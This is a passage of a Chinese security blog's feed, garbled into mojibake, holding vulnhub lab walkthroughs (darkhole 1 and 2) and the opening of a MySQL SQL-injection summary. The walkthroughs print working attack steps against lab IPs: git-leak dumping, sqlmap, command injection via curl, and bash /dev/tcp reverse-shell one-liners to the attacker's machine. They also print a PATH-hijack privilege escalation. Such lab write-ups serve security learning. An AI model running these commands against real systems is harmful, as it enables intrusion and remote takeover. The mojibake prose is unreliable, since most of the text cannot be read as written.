src="https://raw.githubusercontent.com/chencicici/images/main/202206271947654.png"></p><p>ç¿»å®¶ç›®å½•,ç¿»åˆ°ä¸€ä¸ªtxt,æç¤ºæˆ‘ä»¬è¿è¡Œä¸€ä¸ªshè„šæœ¬,è¿è¡Œä¹‹åå‡ºæ¥ä¸€ä¸²å¯†æ–‡<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206271949779.png"></p><p>å°è¯•è§£å¯†onion,åº”è¯¥æ˜¯shrekçš„å¯†ç ,å’Œæœ€å¼€å§‹çš„htmlæ ‡é¢˜ä¸€æ ·â€¦<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206271950204.png"></p><p>sshç™»å½•ä¸Šæ¥<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206271953098.png"></p><p>æŸ¥çœ‹æ‹¥æœ‰sudoæƒé™çš„æ–‡ä»¶<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206271954027.png"></p><p>æœ‰python,ç›´æ¥å†™shell<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206271958787.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;ç¯å¢ƒ&quot;&gt;&lt;a href=&quot;#ç¯å¢ƒ&quot; class=&quot;headerlink&quot; title=&quot;ç¯å¢ƒ&quot;&gt;&lt;/a&gt;ç¯å¢ƒ&lt;/h1&gt;&lt;p&gt;vulnhubé¡¹ç›® &lt;a href=&quot;https://www.vulnhub.com/entry/darkhole-2,740/&quot;&gt;https://www.vulnhub.com/entry/darkhole-2,740/&lt;/a&gt;&lt;br&gt;é¶æœº:172.16.17.155&lt;br&gt;æ”»å‡»æœºkali:172.16.17.140&lt;/p&gt;
&lt;h1 id=&quot;ä¿¡æ¯æ”¶é›†&quot;&gt;&lt;a href=&quot;#ä¿¡æ¯æ”¶é›†&quot; class=&quot;headerlink&quot; title=&quot;ä¿¡æ¯æ”¶é›†&quot;&gt;&lt;/a&gt;ä¿¡æ¯æ”¶é›†&lt;/h1&gt;&lt;p&gt;å¯¹é¶æœºè¿›è¡Œç«¯å£æ‰«æ,å¼€æ”¾äº†21,22,80,å­˜åœ¨Anonymousç”¨æˆ·&lt;br&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202206271926183.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;ç½‘ç«™å°±ä¸€ä¸ªapacheé¦–é¡µ&lt;br&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202206271935104.png&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="æ‰“é¶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="vulnhub" scheme="https://syst1m.top/tags/vulnhub/"/>
    
    <category term="ftp" scheme="https://syst1m.top/tags/ftp/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub-darkhole:2æ‰“é¶</title>
    <link href="https://syst1m.top/2022/06/25/vulnhub-darkhole-2%E6%89%93%E9%9D%B6/"/>
    <id>https://syst1m.top/2022/06/25/vulnhub-darkhole-2%E6%89%93%E9%9D%B6/</id>
    <published>2022-06-25T12:52:23.000Z</published>
    <updated>2022-06-25T14:56:37.361Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h1><p>vulnhubé¡¹ç›® <a href="https://www.vulnhub.com/entry/darkhole-2,740/">https://www.vulnhub.com/entry/darkhole-2,740/</a><br>é¶æœº:172.16.17.154<br>æ”»å‡»æœºkali:172.16.17.140</p><h1 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h1><p>nmap æ‰«æé¶æœº<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252101537.png"></p><p>è®¿é—®ä¸€ä¸‹é¦–é¡µ,çœ‹çœ‹webæŒ‡çº¹<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252102462.png"></p><p>é¦–é¡µåªæœ‰ä¸€ä¸ªç™»å½•åŠŸèƒ½, nmapæ‰«åˆ°ä¸€ä¸ª.gitç›®å½•,ç»§ç»­æ‰«ä¸€ä¸‹ç›®å½•<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252103052.png"></p><p>configå’Œ.gitæŒ¨ä¸ªè®¿é—®,éƒ½å­˜åœ¨ç›®å½•éå†å’Œgitæ³„éœ²<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252104899.png"><br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252108851.png"></p><p>ä¿¡æ¯æ”¶é›†åˆ°æ­¤ç»“æŸ</p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><h2 id="è·å–gitæºç "><a href="#è·å–gitæºç " class="headerlink" title="è·å–gitæºç "></a>è·å–gitæºç </h2><p>è„šæœ¬åœ°å€ <a href="https://github.com/lijiejie/GitHack/">https://github.com/lijiejie/GitHack/</a></p><p>ç”¨è„šæœ¬ä¸‹è½½æºç </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python GitHack.py http://172.16.17.154/.git/</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252140311.png"></p><p>æŸ¥çœ‹ä¸€ä¸‹ç›®å½•ç»“æ„<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252141979.png"></p><p>å¾—åˆ°æ•°æ®åº“è´¦å·å¯†ç ,ä½†æ˜¯å¹¶æœªå¯¹å¤–å¼€æ”¾æ•°æ®åº“ç«¯å£<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252142189.png"></p><p>å®¡è®¡å‡ ä¸ªphpæ–‡ä»¶,æ²¡æœ‰æ”¶è·</p><h2 id="git-log"><a href="#git-log" class="headerlink" title="git log"></a>git log</h2><p>é€’å½’ä¸‹è½½ç›®å½•<br>è„šæœ¬åœ°å€ <a href="https://github.com/arthaud/git-dumper">https://github.com/arthaud/git-dumper</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python git_dumper.py http://172.16.17.154/.git website</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252152596.png"></p><p>å®¡è®¡æ—¥å¿—<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252154557.png"></p><p>ç¬¬ä¸€æ¬¡ä¸ºåˆå§‹åŒ–,ç¬¬äºŒæ¬¡added login.php,ç¬¬ä¸‰æ¬¡changed login.php</p><p>ç¬¬äºŒæ¬¡æ·»åŠ äº†é»˜è®¤å‡­æ®</p><pre><code> I added login.php file with default credentials</code></pre><p>ç»§ç»­è·Ÿè¿›,æŸ¥çœ‹ä¸¤æ¬¡çš„å·®å¼‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git diff a4d900a8d85e8938d3601f3cef113ee293028e10</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°è´¦å·å¯†ç ,åŒæ—¶çœ‹åˆ°sqlè¯­å¥<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252207747.png"></p><h2 id="sqlæ³¨å…¥"><a href="#sqlæ³¨å…¥" class="headerlink" title="sqlæ³¨å…¥"></a>sqlæ³¨å…¥</h2><p>ç™»å½•æˆåŠŸ,çœ‹åˆ°idå­—çœ¼,ç»“åˆä¸Šé¢çœ‹åˆ°çš„sqlè¯­å¥,æ­¤å¤„å­˜åœ¨sqlæ³¨å…¥<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252209727.png"></p><p>ä¿®æ”¹idä¸º0æ—¶,å†…å®¹æ¶ˆå¤±<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252213507.png"></p><p>1&#x3D;1å›æ˜¾æ­£å¸¸<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252217059.png"></p><p>1&#x3D;2æ— å›æ˜¾<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252217080.png"></p><p>ä¸¢sqlmapè·‘,éœ€è¦å¸¦ä¸Šcookie<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252223888.png"></p><p>åœ¨æ•°æ®åº“ä¸­è·‘å‡ºsshå¯†ç <br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252229820.png"></p><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252231283.png"></p><p>æ‹¿åˆ°ç¬¬ä¸€ä¸ªflag<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252232348.png"></p><p>ææƒä¿¡æ¯æ”¶é›†<br>sudo -læ²¡æœ‰<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252234087.png"><br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252234966.png"></p><p>åœ¨å†å²å‘½ä»¤ç¿»åˆ°å¯ç–‘è®°å½•<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252236595.png"><br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252236339.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&quot;http://localhost:999/?cmd=id&quot;</span> </span><br><span class="line">curl <span class="string">&quot;http://localhost:9999/?cmd=id&quot;</span></span><br><span class="line">curl <span class="string">&quot;http://127.0.0.1:9999/?cmd=ls -la&quot;</span></span><br><span class="line">curl <span class="string">&quot;http://127.0.0.1:9999/?cmd=ls%20-la&quot;</span></span><br><span class="line">curl <span class="string">&quot;http://127.0.0.1:9999/?cmd=cd%20~&amp;ls&quot;</span></span><br><span class="line">curl <span class="string">&quot;http://127.0.0.1:9999/?cmd=cd%20~&amp;&amp;ls&quot;</span></span><br><span class="line">curl <span class="string">&quot;http://127.0.0.1:9999/?cmd=cd%20~||ls&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>çœ‹æ¥å­˜åœ¨å‘½ä»¤æ‰§è¡Œ<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252238693.png"></p><p>å‘ç°,æ˜¯losyç”¨æˆ·,åå¼¹ä¸€ä¸ªshell,éœ€è¦æ³¨æ„çš„æ˜¯,å› ä¸ºæ˜¯urlæ‰§è¡Œ,æ‰€ä»¥éœ€è¦urlç¼–ç </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&quot;http://127.0.0.1:9999/?cmd=bash%20-c%20&#x27;exec%20bash%20-i%20%26%3E%2Fdev%2Ftcp%2F172.16.17.140%2F4444%20%3C%261&#x27;&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252251755.png"></p><p>å†å²å‘½ä»¤çœ‹åˆ°å¯†ç <br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252250920.png"></p><p>sshä¸Šlosyç”¨æˆ·æŸ¥çœ‹sudoæƒé™çš„æ–‡ä»¶<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252252937.png"></p><p>æ ¹æ®å†å²å‘½ä»¤çš„æç¤º,ç”¨pythonæ‹¿åˆ°ä¸€ä¸ªshell<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252255400.png"></p><p>æ‹¿åˆ°æœ€åçš„flag<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252256615.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;ç¯å¢ƒ&quot;&gt;&lt;a href=&quot;#ç¯å¢ƒ&quot; class=&quot;headerlink&quot; title=&quot;ç¯å¢ƒ&quot;&gt;&lt;/a&gt;ç¯å¢ƒ&lt;/h1&gt;&lt;p&gt;vulnhubé¡¹ç›® &lt;a href=&quot;https://www.vulnhub.com/entry/darkhole-2,740/&quot;&gt;https://www.vulnhub.com/entry/darkhole-2,740/&lt;/a&gt;&lt;br&gt;é¶æœº:172.16.17.154&lt;br&gt;æ”»å‡»æœºkali:172.16.17.140&lt;/p&gt;
&lt;h1 id=&quot;ä¿¡æ¯æ”¶é›†&quot;&gt;&lt;a href=&quot;#ä¿¡æ¯æ”¶é›†&quot; class=&quot;headerlink&quot; title=&quot;ä¿¡æ¯æ”¶é›†&quot;&gt;&lt;/a&gt;ä¿¡æ¯æ”¶é›†&lt;/h1&gt;&lt;p&gt;nmap æ‰«æé¶æœº&lt;br&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202206252101537.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;è®¿é—®ä¸€ä¸‹é¦–é¡µ,çœ‹çœ‹webæŒ‡çº¹&lt;br&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202206252102462.png&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="æ‰“é¶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="vulnhub" scheme="https://syst1m.top/tags/vulnhub/"/>
    
    <category term="ä¿¡æ¯æ³„éœ²" scheme="https://syst1m.top/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub-darkhole:1æ‰“é¶</title>
    <link href="https://syst1m.top/2022/06/24/vulnhub-darkhole:1%E6%89%93%E9%9D%B6/"/>
    <id>https://syst1m.top/2022/06/24/vulnhub-darkhole:1%E6%89%93%E9%9D%B6/</id>
    <published>2022-06-24T09:18:07.000Z</published>
    <updated>2022-06-24T14:55:30.432Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h1><p>vulnhubé¡¹ç›® <a href="https://www.vulnhub.com/entry/darkhole-1,724/">https://www.vulnhub.com/entry/darkhole-1,724/</a><br>é¶æœº:172.16.17.153<br>æ”»å‡»æœºkali:172.16.17.140</p><h1 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h1><p>nmapæ‰«ä¸€ä¸‹<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206241816412.png"></p><p>æ’ä»¶çœ‹åˆ°webæŒ‡çº¹<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206242200037.png"></p><p>æ‰«ä¸€ä¸‹ç›®å½•<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206241829627.png"></p><p>configç›®å½•å­˜åœ¨ç›®å½•éå†,ä¸‹è½½ä¸ä¸‹æ¥<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206241830409.png"></p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><h2 id="å‚ç›´è¶Šæƒ"><a href="#å‚ç›´è¶Šæƒ" class="headerlink" title="å‚ç›´è¶Šæƒ"></a>å‚ç›´è¶Šæƒ</h2><p>æ³¨å†Œä¸€ä¸ªè´¦å·çœ‹çœ‹,åœ¨æ³¨å†Œçš„æ—¶å€™,ç”¨æˆ·åä½¿ç”¨admin,æŠ¥ç”¨æˆ·æˆ–è€…é‚®ç®±å­˜åœ¨,åº”è¯¥å­˜åœ¨ä¸€ä¸ªadminè´¦å·,ç»§ç»­å¾€ä¸‹<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206241827069.png"></p><p>ç™»å½•è¿›å»,å‘ç°å¯ä»¥ä¿®æ”¹å¯†ç ,åŒæ—¶urlå¤„çœ‹åˆ°id&#x3D;2<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206242147073.png"></p><p>ä¿®æ”¹idä¸º1,æç¤ºæ²¡æœ‰æƒé™,é‚£ä¹ˆæ­¤å¤„åº”è¯¥å­˜åœ¨è¶Šæƒ<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206242148896.png"></p><p>æŠ“åŒ…ä¿®æ”¹å¯†ç çš„æ•°æ®åŒ…<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206242151674.png"></p><p>ä¿®æ”¹idå‚æ•°<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206242153137.png"></p><p>é€€å‡ºtestè´¦å·,ä½¿ç”¨adminç™»å½•,ç™»å½•æˆåŠŸ,å‡ºç°ä¸€ä¸ªä¸Šä¼ ç‚¹<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206242155345.png"></p><h2 id="ä¸Šä¼ webshell"><a href="#ä¸Šä¼ webshell" class="headerlink" title="ä¸Šä¼ webshell"></a>ä¸Šä¼ webshell</h2><p>ä¸Šä¼ ä¸€å¥è¯å‘ç°æœ‰é™åˆ¶<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206242158827.png"></p><p>ä¼ ä¸€ä¸ª.php3åç¼€çš„è¯•è¯•,å‘ç°å¯ä»¥ä¸Šä¼ ,è™½ç„¶ä¸è¢«è§£æ,ä½†èµ·ç è¯´æ˜å¹¶ä¸æ˜¯ç™½åå•<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206242156017.png"></p><p>å‰é¢å¾—åˆ°æœåŠ¡å™¨ä¸ºapache,å°è¯•apacheè§£ææ¼æ´,æŠ“åŒ…æ…¢æ…¢fuzz<br>æœ€åä½¿ç”¨.phtmlæˆåŠŸç»•è¿‡,<a href="https://syst1m.top/2022/05/01/%E4%B8%AD%E9%97%B4%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">ä¸­é—´ä»¶è§£ææ¼æ´</a></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206242215173.png"></p><p>çœ‹ä¸€ä¸‹æœ€å¼€å§‹ä¿¡æ¯æ”¶é›†çš„é‚£ä¸ªdatabase.php,å¾—åˆ°æ•°æ®åº“è´¦å·å¯†ç <br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206242227736.png"></p><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>èšå‰‘åå¼¹ä¸€ä¸ªäº¤äº’å¼shellåˆ°kali</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c <span class="string">&#x27;exec bash -i &amp;&gt;/dev/tcp/172.16.17.140/4444 &lt;&amp;1&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206242219996.png"></p><p>åœ¨å®¶ç›®å½•ä¸‹ç¿»åˆ°ä¸€ä¸ªjohnç”¨æˆ·,å­˜åœ¨rootæƒé™çš„æ–‡ä»¶<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206242229612.png"></p><p>è¿è¡Œå‘ç°æ˜¯ä»¥johnç”¨æˆ·æ‰§è¡Œäº†idå‘½ä»¤<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206242230601.png"></p><p>æ€è·¯:æˆ‘ä»¬å¯ä»¥è‡ªå·±æ„é€ ä¸€ä¸ªidå‘½ä»¤å†™å…¥shell,æ›¿æ¢æ‰åŸæ¥çš„ç¯å¢ƒå˜é‡åˆ°è¿™æˆ‘ä»¬æ„é€ çš„idå‘½ä»¤ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;/bin/bash&#x27;</span> &gt; /tmp/id; <span class="built_in">chmod</span> +x /tmp/id; <span class="built_in">export</span> PATH=/tmp:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206242235087.png"></p><p>åœ¨johnå®¶ç›®å½•ä¸‹å¾—åˆ°flagå’Œjohnçš„å¯†ç <br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206242243076.png"></p><p>sshå¾—åˆ°ä¸€ä¸ªå®Œå…¨äº¤äº’å¼shell<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206242244133.png"></p><p>çœ‹ä¸€ä¸‹sudoæ‰§è¡Œçš„æ–‡ä»¶<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206242252290.png"></p><p>å†™å…¥åå¼¹shellçš„pythonè¯­å¥<br>è¿™é‡Œè¦æ³¨æ„,è¦ä½¿ç”¨ç»å¯¹è·¯å¾„å»æ‰§è¡Œfile.py,å¦åˆ™ä¼šæŠ¥æƒé™ä¸å¤Ÿ<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206242253772.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;ç¯å¢ƒ&quot;&gt;&lt;a href=&quot;#ç¯å¢ƒ&quot; class=&quot;headerlink&quot; title=&quot;ç¯å¢ƒ&quot;&gt;&lt;/a&gt;ç¯å¢ƒ&lt;/h1&gt;&lt;p&gt;vulnhubé¡¹ç›® &lt;a href=&quot;https://www.vulnhub.com/entry/darkhole-1,724/&quot;&gt;https://www.vulnhub.com/entry/darkhole-1,724/&lt;/a&gt;&lt;br&gt;é¶æœº:172.16.17.153&lt;br&gt;æ”»å‡»æœºkali:172.16.17.140&lt;/p&gt;
&lt;h1 id=&quot;ä¿¡æ¯æ”¶é›†&quot;&gt;&lt;a href=&quot;#ä¿¡æ¯æ”¶é›†&quot; class=&quot;headerlink&quot; title=&quot;ä¿¡æ¯æ”¶é›†&quot;&gt;&lt;/a&gt;ä¿¡æ¯æ”¶é›†&lt;/h1&gt;&lt;p&gt;nmapæ‰«ä¸€ä¸‹&lt;br&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202206241816412.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;æ’ä»¶çœ‹åˆ°webæŒ‡çº¹&lt;br&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202206242200037.png&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="æ‰“é¶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="vulnhub" scheme="https://syst1m.top/tags/vulnhub/"/>
    
    <category term="è¶Šæƒ" scheme="https://syst1m.top/tags/%E8%B6%8A%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>sqlæ³¨å…¥ä¹‹mysqlæ³¨å…¥å§¿åŠ¿åŠç»•è¿‡æ€»ç»“</title>
    <link href="https://syst1m.top/2022/06/24/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bmysql%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF%E5%8F%8A%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/"/>
    <id>https://syst1m.top/2022/06/24/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bmysql%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF%E5%8F%8A%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/</id>
    <published>2022-06-24T05:37:14.000Z</published>
    <updated>2022-06-30T05:26:45.691Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SQLæ³¨å…¥æ¼æ´"><a href="#SQLæ³¨å…¥æ¼æ´" class="headerlink" title="SQLæ³¨å…¥æ¼æ´"></a>SQLæ³¨å…¥æ¼æ´</h1><h2 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h2><p>éšç€äº’è”ç½‘webå’Œä¿¡æ¯æŠ€æœ¯çš„å‘å±•ï¼Œåœ¨webåç«¯ä½œä¸ºå­˜å‚¨å’Œç®¡ç†çš„çš„æ•°æ®åº“ä¹Ÿå¾—åˆ°äº†å¹¿æ³›çš„åº”ç”¨ï¼Œä¸webç»“åˆè¾ƒä¸ºç´§å¯†çš„æ•°æ®åº“åŒ…æ‹¬Mysqlï¼ŒSqlserverï¼ŒOracleï¼ŒSqlliteï¼ŒDb2ï¼ŒAccessç­‰ç­‰ã€‚ æ•°æ®å­˜å‚¨å’Œç®¡ç†ä½œä¸ºåº”ç”¨çš„ä¸€ä¸ªåŸºæœ¬éœ€æ±‚ï¼Œåœ¨ç»å¤§å¤šæ•°çš„åº”ç”¨é‡Œéƒ½å¾—åˆ°äº†ä½¿ç”¨ï¼Œè¿™ç§å¤§é¢ç§¯çš„ä½¿ç”¨ä¹Ÿæ„å‘³ç€åœ¨æ•°æ®åº“æ“ä½œæ–¹é¢å¦‚æœå¤„ç†ä¸å½“å‡ºç°é—®é¢˜çš„å¯èƒ½æ€§ä¼šå¾ˆå¤§ï¼Œå¦å¤–ä¸€æ–¹é¢ç”±äºæ•°æ®åº“æ‰¿è½½äº†åº”ç”¨çš„æ•°æ®ä¿¡æ¯ï¼Œå¦‚æœæ•°æ®åº“å‡ºç°é—®é¢˜ä¸€æ–¹é¢å¯èƒ½å¯¼è‡´æ•æ„Ÿæ•°æ®çš„æ³„éœ²å’Œç¯¡æ”¹ï¼ˆå¦‚ä¿¡ç”¨å¡è´¦æˆ·ï¼Œç”¨æˆ·å¯†ç ï¼Œç®¡ç†è´¦æˆ·å’Œå¯†ç ï¼Œé”€å”®è®°å½•ç­‰ç­‰ï¼‰ï¼Œç›´æ¥å¯¼è‡´æŸå¤±å’Œåº”ç”¨è¢«æ”»é™·ï¼Œå¦å¤–ä¸€æ–¹é¢ï¼Œå³ä½¿æ•°æ®åº“ä¸­ä¸æ‰¿è½½è¾ƒä¸ºæ•æ„Ÿçš„ä¿¡æ¯ï¼Œç”±äºæ•°æ®åº“çš„ç‰¹æ®Šæ€§ï¼Œæ•°æ®åº“è¢«æ”»å‡»çš„è¯ä¹Ÿå¯ä»¥ç›´æ¥å¯¼è‡´åº”ç”¨ç¨‹åºå´©æºƒåŠå…¶ä»–ä¸¥é‡çš„åæœã€‚</p><h2 id="æ¼æ´æˆå› "><a href="#æ¼æ´æˆå› " class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h2><p>åº”ç”¨ä¸ºäº†å’Œæ•°æ®åº“è¿›è¡Œæ²Ÿé€šå®Œæˆå¿…è¦çš„ç®¡ç†å’Œå­˜å‚¨å·¥ä½œï¼Œå¿…é¡»å’Œæ•°æ®åº“ä¿ç•™ä¸€ç§æ¥å£ã€‚ç›®å‰çš„æ•°æ®åº“ä¸€èˆ¬éƒ½æ˜¯æä¾›apiä»¥æ”¯æŒç®¡ç†ï¼Œåº”ç”¨ä½¿ç”¨åº•å±‚å¼€å‘è¯­è¨€å¦‚Phpï¼ŒJavaï¼Œaspï¼ŒPythonä¸è¿™äº›apiè¿›è¡Œé€šè®¯ã€‚å¯¹äºæ•°æ®åº“çš„æ“ä½œï¼Œç›®å‰æ™®éä½¿ç”¨ä¸€ç§SQLè¯­è¨€ï¼ˆStructured Query Languageè¯­è¨€ï¼ŒSQLè¯­è¨€çš„åŠŸèƒ½åŒ…æ‹¬å¢åˆ æŸ¥æ”¹ç­‰ï¼Œæ˜¯ä¸€ä¸ªç»¼åˆçš„ã€é€šç”¨çš„å…³ç³»æ•°æ®åº“è¯­è¨€ï¼ŒåŒæ—¶åˆæ˜¯ä¸€ç§é«˜åº¦éè¿‡ç¨‹åŒ–çš„è¯­è¨€ï¼Œåªè¦æ±‚ç”¨æˆ·æŒ‡å‡ºåšä»€ä¹ˆè€Œä¸éœ€è¦æŒ‡å‡ºæ€ä¹ˆåšï¼‰ï¼ŒSQLä½œä¸ºå­—ç¬¦ä¸²é€šè¿‡APIä¼ å…¥ç»™æ•°æ®åº“ï¼Œæ•°æ®åº“å°†æŸ¥è¯¢çš„ç»“æœè¿”å›ï¼Œæ•°æ®åº“è‡ªèº«æ˜¯æ— æ³•åˆ†è¾¨ä¼ å…¥çš„SQLæ˜¯åˆæ³•çš„è¿˜æ˜¯ä¸åˆæ³•çš„ï¼Œå®ƒå®Œå…¨ä¿¡ä»»ä¼ å…¥çš„æ•°æ®ï¼Œå¦‚æœä¼ å…¥çš„SQLè¯­å¥è¢«æ¶æ„ç”¨æˆ·æ§åˆ¶æˆ–è€…ç¯¡æ”¹ï¼Œå°†å¯¼è‡´æ•°æ®åº“ä»¥å½“å‰è°ƒç”¨è€…çš„èº«ä»½æ‰§è¡Œé¢„æœŸä¹‹å¤–çš„å‘½ä»¤å¹¶ä¸”è¿”å›ç»“æœï¼Œå¯¼è‡´å®‰å…¨é—®é¢˜ã€‚ é‚£ä¹ˆæ¶æ„ç”¨æˆ·å¦‚ä½•æ‰èƒ½æ§åˆ¶ä¼ å…¥çš„SQLè¯­å¥å‘¢ï¼Ÿæˆ‘ä»¬çŸ¥é“ï¼Œæ—¢ç„¶ä¼ å…¥çš„SQLæ˜¯ä»¥å­—ç¬¦ä¸²çš„æ–¹å¼ä¼ å…¥çš„ï¼Œè¿™ä¸ªå­—ç¬¦ä¸²ç”±åº”ç”¨ç”Ÿæˆï¼Œé‚£ä¹ˆå¦‚æœåº”ç”¨ç”Ÿæˆè¿™ä¸ªå­—ç¬¦ä¸²çš„æ–¹å¼ä¸å¯¹å°±å¯èƒ½å¯¼è‡´é—®é¢˜ï¼Œè­¬å¦‚è€ƒè™‘å¦‚ä¸‹çš„åŠŸèƒ½ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 